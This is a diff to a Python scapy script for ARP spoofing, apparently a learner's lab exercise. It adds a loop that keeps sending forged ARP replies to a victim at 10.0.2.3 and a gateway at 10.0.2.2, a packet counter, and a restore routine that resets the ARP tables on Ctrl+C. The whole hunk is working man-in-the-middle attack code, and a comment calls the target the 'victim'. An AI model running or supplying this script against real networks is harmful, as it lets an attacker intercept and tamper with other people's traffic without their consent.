@@ -21,9 +21,30 @@ def spoof(target_ip, spoof_ip):
     # we are sending a ARP resonse (without a request) to the victim, with the source IP of the gatway
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     #packet.show()
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
-while True:
-    spoof("10.0.2.3", "10.0.2.2")
-    spoof("10.0.2.2", "10.0.2.3")
-    time.sleep(2)
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+    #print(packet.show())
+    #print(packet.summary())
+
+target_ip = "10.0.2.3"
+gateway_ip ="10.0.2.2"
+
+try:
+    sent_packet_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packet_count = sent_packet_count + 2
+        print("\r[+] Packets Sent: " + str(sent_packet_count), end="")
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C.....Resetting ARP tables....Please wait...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    
